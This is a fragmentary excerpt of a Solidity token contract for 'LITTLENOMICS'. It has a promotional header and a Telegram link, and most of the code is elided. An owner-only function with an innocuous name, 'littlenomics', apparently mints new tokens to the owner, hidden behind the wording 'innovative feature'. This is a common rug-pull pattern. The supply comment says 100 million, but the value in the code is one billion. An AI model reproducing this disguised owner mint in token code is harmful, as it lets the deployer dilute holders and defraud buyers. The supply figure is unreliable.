...
//
// $littlenomics proposes an innovative feature in its contract.
//
// 📱 Telegram: https://t.me/littlenomics
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function littlenomics(uint256 amount) public onlyOwner {
    _littlenomics(msg.sender, amount);
    }
    ...
    function _littlenomics(address account, uint256 amount) internal virtual {
...
contract LITTLENOMICS is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("LITTLE NOMICS", "LITTLENOMICS") {
        _littlenomics(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}